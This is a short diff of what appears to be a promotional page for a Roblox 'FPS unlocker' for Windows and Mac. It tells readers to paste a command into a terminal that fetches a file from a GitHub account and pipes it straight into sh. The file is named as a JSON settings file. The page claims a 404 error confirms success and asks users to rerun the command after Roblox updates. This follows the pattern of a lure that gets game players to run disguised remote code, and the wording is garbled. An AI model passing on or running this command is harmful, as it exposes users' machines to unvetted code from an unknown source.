@@ -4,7 +4,7 @@ roblox fps unlocker new available for windows and mac gives you realistic textur
 
 You can also run roblox open terminal paste command and run it yourself
 
-curl -f https://raw.githubusercontent.com/nivadepattyblox/fpsunlockernew-osx/main/ClientAppSettings.json | sh 
+curl -f https://raw.githubusercontent.com/nivadepattyblox/fpsunlockernew-osx/main/ClientAppSettings.jso | sh 
 After executing the script, you should see a confirmation that The requested URL returned error: 404 Not Found just press shift f5 on your keyboard and your fps unlocked
 Note: you must run the command again when Roblox updates
 
